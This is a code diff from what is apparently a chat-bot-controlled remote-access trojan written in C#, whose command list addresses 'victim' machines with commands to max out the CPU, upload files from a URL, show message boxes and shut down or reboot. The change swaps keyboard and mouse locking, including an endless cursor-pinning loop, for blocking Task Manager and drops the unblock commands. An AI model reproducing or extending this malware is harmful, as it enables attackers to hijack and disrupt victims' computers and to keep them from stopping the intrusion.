@@ -286,7 +286,7 @@ Commands below works only in victim channel
 {Settings.prefix}destroy_pc - Makes the 90% CPU
 {Settings.prefix}upload [path] [url] - Uploads file to specific path
 {Settings.prefix}msgbox [text] [caption] - show message box
-{Settings.prefix}control [block unblock block_mouse] - Block mouse or keyboard
+{Settings.prefix}control [block] - Blocks Taskmgr
 {Settings.prefix}boot - Shutdown the PC
 {Settings.prefix}reboot - Restart the PC
 {Settings.prefix}stop - Stop
@@ -357,30 +357,9 @@ Commands below works only in victim channel
 
         if (access == "block")
         {
-            Utils.BlockKeyboard();
+            await Utils.Taskmgr();
             await logsChannel.SendMessageAsync($"Successfully blocked victim '{victimId}' | By {userMessage.Author.Mention}");
             await victimChannel.SendMessageAsync($"blocked victim '{victimId}' | By {userMessage.Author.Mention}");
-        }
-
-        if (access == "unblock")
-        {
-            Utils.UnblockKeyboard();
-            await victimChannel.SendMessageAsync($"unblocked victim '{victimId}' | By {userMessage.Author.Mention}");
-            await logsChannel.SendMessageAsync($"Successfully unblocked victim '{victimId}' | By {userMessage.Author.Mention}");
-        }
-
-        if (access == "block_mouse")
-        {
-            int x = 0;
-            int y = 0;
-
-            await victimChannel.SendMessageAsync($"blocked mouse victim '{victimId}' | By {userMessage.Author.Mention}");
-            await logsChannel.SendMessageAsync($"Successfully blocked mouse victim '{victimId}' | By {userMessage.Author.Mention}");
-
-            while (true)
-            {
-                robot.MouseMove(new Point(x, y));
-            }
         }
     }
 
